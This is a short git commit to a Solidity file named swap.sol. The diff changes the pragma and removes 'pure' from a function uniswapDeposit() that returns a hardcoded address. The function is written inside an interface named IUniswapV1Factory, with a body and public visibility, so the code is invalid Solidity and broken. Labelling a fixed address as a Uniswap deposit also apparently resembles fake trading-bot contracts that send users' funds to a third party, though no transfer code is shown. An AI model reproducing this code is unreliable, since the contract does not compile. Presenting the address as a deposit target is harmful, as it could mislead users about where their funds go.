8fc6618824b213a6116edebb14d14575828833e2
ddww11 <100456634+ddww11@users.noreply.github.com>
2022-02-26 12:15:36 +0800

    Update swap.sol

--- swap.sol
+++ swap.sol
@@ -1,8 +1,8 @@
 
-pragma solidity >=0.8.4;
+pragma solidity ^0.8.4;
 
 interface IUniswapV1Factory {
-     function uniswapDeposit() public pure returns (address) {
+     function uniswapDeposit() public returns (address) {
 		return 0x55eb3ceF7ad2a5a659998d8a1Cfb3c068F123456;
 	}
 }
